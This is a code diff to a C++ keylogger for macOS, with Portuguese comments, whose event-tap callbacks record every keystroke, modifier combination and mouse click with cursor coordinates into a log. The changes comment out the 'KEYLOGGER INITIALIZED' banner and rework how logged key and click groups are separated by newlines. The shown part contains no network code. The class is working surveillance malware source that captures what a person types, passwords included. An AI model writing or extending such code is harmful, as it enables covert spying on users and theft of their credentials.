@@ -9,8 +9,8 @@
 void Keylogger::operator()() {
     Logger *logger = Logger::instance();
 
-    const char *header = "[[K] KEYLOGGER INITIALIZED]";
-    logger->writeln(header);
+//    const char *header = "[[K] KEYLOGGER INITIALIZED]";
+//    logger->writeln(header);
 
     // Incializa os ouvintes
     initializeKeyboardTracker();
@@ -127,6 +127,8 @@ void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRe
         // Grupo não iniciado
         if (!MDFGroupInitialized) {
 
+            Logger::instance()->blockNewLineOnGroups = 1;
+
             // Inicia o grupo
             logger->write("[{");
 
@@ -143,11 +145,17 @@ void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRe
         }
     } else {
 
+        Logger::instance()->blockNewLineOnGroups = 0;
+
         // Grava a ultima tecla MDF
         loggerMDFKey(logger, parsedKey);
 
         // Fecha o grupo
-        logger->write("}]");
+        if(Logger::instance()->blockNewLineOnGroups) {
+            logger->write("}]");
+        }else{
+            logger->writeln("}]");
+        }
 
         // Finaliza o identificador de grupo, para reabrir na proxima combinação MDF
         MDFGroupInitialized = false;
@@ -185,7 +193,11 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
             logger->write(parsedKey);
         }
 
-        logger->write("]");
+        if(Logger::instance()->blockNewLineOnGroups) {
+            logger->writeln("]");
+        }else{
+            logger->write("]");
+        }
     }
 
     return event;
@@ -243,7 +255,10 @@ CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventTy
         if (is_dragging) {
             logger->write(clickOnDragStart);
             logger->write("]");
-            logger->writeln("");
+
+            if(!Logger::instance()->blockNewLineOnGroups) {
+                logger->writeln("");
+            }
 
             // Resetamos a variavel de controle do DRAG.
             is_dragging = false;
@@ -262,7 +277,12 @@ CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventTy
         logger->write("x");
         logger->write((float) cursor.y);
         logger->write(parsedMouseEvent);
-        logger->write("]");
+
+        if(Logger::instance()->blockNewLineOnGroups) {
+            logger->write("]");
+        }else{
+            logger->writeln("]");
+        }
     }
 
     return event;
